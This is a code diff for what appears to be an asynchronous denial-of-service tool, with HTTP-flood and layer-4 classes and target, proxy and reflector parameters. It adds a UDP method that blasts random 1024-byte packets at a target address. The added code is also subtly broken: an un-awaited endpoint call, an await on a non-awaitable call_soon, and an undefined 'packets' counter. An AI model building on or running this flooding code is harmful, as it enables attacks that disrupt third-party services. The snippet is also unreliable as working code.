@@ -957,6 +957,7 @@ class AsyncHttpFlood(HttpFlood):
         return await self._generic_flood(payload)
 
 
+# XXX: the separation should be based on the socket type: TCP vs. UDP
 class AsyncLayer4(Layer4):
 
     async def run(self) -> int:
@@ -998,6 +999,20 @@ class AsyncLayer4(Layer4):
         writer.close()
         await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
+
+    async def UDP(self) -> int:
+        packets_sent, packet_size = 0, 1024
+        # XXX: this is not going to work as well
+        loop = asyncio.get_event_loop()
+        # XXX: using callback-based Protocol is just .. awful :(
+        transport, protocol = loop.create_datagram_endpoint(
+            asyncio.DatagramProtocol, remote_addr=self._raw_target)
+        # XXX: does it even support RCP config?
+        for _ in range(100):
+            # let the loop to run other callbacks though it looks ugly
+            await loop.call_soon(transport.sendto, randbytes(packet_size))
+            packets += 1
+        return packets
 
 
 def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
